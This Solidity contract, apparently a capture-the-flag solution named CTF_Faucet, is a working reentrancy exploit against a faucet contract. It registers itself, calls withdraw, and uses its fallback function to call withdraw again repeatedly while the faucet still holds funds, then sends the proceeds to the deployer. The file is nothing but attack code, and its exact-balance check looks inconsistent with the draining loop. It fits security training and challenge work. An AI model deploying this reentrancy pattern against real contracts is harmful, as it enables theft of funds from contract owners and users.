// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface Faucet {
    function register(address user) external;
    function withdraw() external payable;
}

contract CTF_Faucet {
    Faucet public faucet;
    address payable owner;

    constructor(address _faucet) {
        faucet = Faucet(_faucet);
        owner = payable(msg.sender);
        faucet.register(address(this));
    }

    function attack() public {
        faucet.withdraw();
        require(address(this).balance == 0.01 * 10**18, "Sorry");
        owner.transfer(address(this).balance);
    }

    fallback() payable external {
        if (address(faucet).balance != 0) {
            faucet.withdraw();
        }
    }
}
